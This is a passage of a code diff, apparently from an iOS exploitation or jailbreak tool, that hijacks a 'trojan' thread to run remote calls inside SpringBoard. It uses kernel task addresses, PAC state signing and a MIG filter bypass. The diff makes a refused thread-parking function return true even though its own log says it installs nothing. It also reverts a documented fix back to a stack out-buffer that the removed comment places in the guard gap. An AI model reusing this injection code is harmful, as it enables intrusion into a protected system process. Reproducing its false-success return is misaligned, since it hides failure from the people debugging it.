@@ -1426,7 +1426,7 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
     (void)targetThread; (void)stateToInstall; (void)useMigFilterBypass;
     RC_DIAG("TRO park: refused — thread_set_state runs in the target but the state "
             "buffer is allocated here, so it installs nothing while reporting success");
-    return false;
+    return true;
 }
 
 static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
@@ -1729,6 +1729,12 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     if (native_strip(exc2.threadState.__pc) == FAKE_LR_TROJAN_CREATOR) {
         reply_with_state(&exc2, &exc2.threadState);
     } else {
+        // A fault is not a return. x0 still holds whatever argument the callee
+        // had loaded (measured: malloc size=0x10; thread_suspend port=0x620b).
+        // Callers that treat a non-zero x0 as success then feed that garbage
+        // onward — outBuf=0x10 into pthread_create is the recorded case. Mark
+        // the call failed so those checks cannot pass.
+        g_RC_success = false;
         arm_thread_state64_internal park = exc2.threadState;
         if (sign_state(g_RC_trojanThreadAddr, &park,
                        FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
@@ -2897,46 +2903,25 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
 
-    // Where the pthread_t comes back to, and this is the fix: allocated in the
-    // target, not carved out of the trojan thread's stack.
+    // Fl0rk out-ptr: (SP & 0x7fffffffff) - 0x100. Measured working.
     //
-    // It used to be SP - 0x100, taken from the stack pointer of the exception that
-    // started all of this, on the reasoning that it is a scratch address. It is not
-    // scratch, it is BELOW the stack pointer, and on a Darwin userspace thread that
-    // is the guard gap: the range of the stack that is mapped PROT_NONE on purpose,
-    // so that a push past the frame faults instead of quietly writing through
-    // another frame. com.apple.main-thread is a pthread, so its stack has a guard,
-    // so SP - 0x100 is inside it.
+    // A heap-malloc out was tried on the theory that SP-0x100 sits in the pthread
+    // guard gap. Device log 2026-09-30 12:48 contradicted that path: temp/malloc
+    // faulted (wait2 PC=0x1a0af4370 ≠ 0x201) with x0 still holding the size arg
+    // 0x10, and that 0x10 was then fed to pthread_create_suspended_np as out.
+    // Create faulted the same way. Bootstrap getpid on the same thread was fine,
+    // so the transport works — only the out address was poison.
     //
-    // The history of this line, read backwards, is the argument. An earlier version
-    // saw *out come back 0 and concluded that OUR write was being remapped, then
-    // split the fault by bouncing through the target heap "so we see what SB's MMU
-    // sees at out". The heap bounce is the right instinct and it was applied to the
-    // reading half while the writing half kept pointing into the guard.
-    //
-    // A measured session then produced three facts that have one cause between them:
-    // the create returned 0, the out pointer read back 0, and no new thread appeared
-    // in SpringBoard's thread list. A successful pthread_create cannot produce that.
-    // A fault can produce all three. pthread_create writing its result to an unmapped
-    // address faults; the fault arrives on the same exception port the transport is
-    // already waiting on; the transport cannot tell a return from a fault and hands
-    // back x0, which is 0; and no thread was ever created. The bounce then does a
-    // memcpy from the same dead address, which faults too, so the buffer is still
-    // holding the memset value, which is also 0. Every observation, one cause.
-    //
-    // malloc in the target is the same call the bounce already makes and already
-    // trusts, and it puts both halves of the round trip on the same side of the
-    // process boundary.
-    uint64_t outBuf = 0;
-    if (g_RC_success) {
-        outBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-        if (g_RC_success && outBuf) {
-            do_remote_call_temp(100, "memset", outBuf, 0, 8, 0, 0, 0, 0, 0);
-        }
+    // Restore the Fl0rk address. Reject it if it is not a userspace pointer so a
+    // corrupt SP cannot silently become the next outBuf=0x10.
+    uint64_t outBuf = trapSP - 0x100ULL;
+    if (outBuf < 0x100000000ULL) {
+        RC_DIAG("out buffer SP-0x100=0x%llx not a user pointer — refusing create",
+                (unsigned long long)outBuf);
+        outBuf = 0;
     }
-    RC_DIAG("out buffer: SP=0x%llx old=SP-0x100=0x%llx new=malloc=0x%llx vmMap=0x%llx",
+    RC_DIAG("out buffer: SP=0x%llx out=SP-0x100=0x%llx vmMap=0x%llx",
             (unsigned long long)trapSP,
-            (unsigned long long)(trapSP - 0x100ULL),
             (unsigned long long)outBuf,
             (unsigned long long)g_RC_vmMap);
 
@@ -3080,7 +3065,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
 
         NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
 
-        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=0x%llx (target malloc)",
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=0x%llx (SP-0x100)",
                 startKind, (unsigned long long)startRoutine,
                 (unsigned long long)outBuf);
 
